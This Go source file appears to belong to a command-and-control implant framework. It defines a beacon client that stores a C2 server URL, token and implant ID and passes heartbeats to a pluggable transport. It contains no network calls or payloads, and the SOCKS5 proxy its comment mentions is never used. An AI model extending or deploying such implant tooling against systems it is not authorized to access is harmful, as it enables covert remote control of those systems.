package beacon

import (
	"encoding/json"
	"fmt"
)

// BeaconFunc is a function that sends a heartbeat and returns the server response.
// The transport.TransportChain implements this for multi-protocol fallback.
type BeaconFunc func(hb *ImplantHeartbeat) (*BeaconResponse, error)

// Client communicates with the C2 server.
type Client struct {
	serverURL  string
	token      string
	implantID  string
	beaconFunc BeaconFunc
}

// NewClient creates a beacon client with default direct HTTP.
// If proxyAddr is non-empty, traffic routes through that SOCKS5 proxy.
func NewClient(serverURL, token, implantID, proxyAddr string) *Client {
	return &Client{
		serverURL: serverURL,
		token:     token,
		implantID: implantID,
	}
}

// SetBeaconFunc overrides the default beacon function with a custom transport.
func (c *Client) SetBeaconFunc(fn BeaconFunc) {
	c.beaconFunc = fn
}

// ImplantID returns the current implant ID.
func (c *Client) ImplantID() string { return c.implantID }

// Beacon sends a heartbeat and returns the server response.
func (c *Client) Beacon(hb *ImplantHeartbeat) (*BeaconResponse, error) {
	if c.beaconFunc != nil {
		return c.beaconFunc(hb)
	}
	return nil, fmt.Errorf("no beacon function configured")
}

// MarshalHeartbeat serializes a heartbeat to JSON (used by transports).
func MarshalHeartbeat(hb *ImplantHeartbeat) ([]byte, error) {
	return json.Marshal(hb)
}

// UnmarshalResponse deserializes a beacon response from JSON (used by transports).
func UnmarshalResponse(data []byte) (*BeaconResponse, error) {
	var br BeaconResponse
	if err := json.Unmarshal(data, &br); err != nil {
		return nil, err
	}
	return &br, nil
}
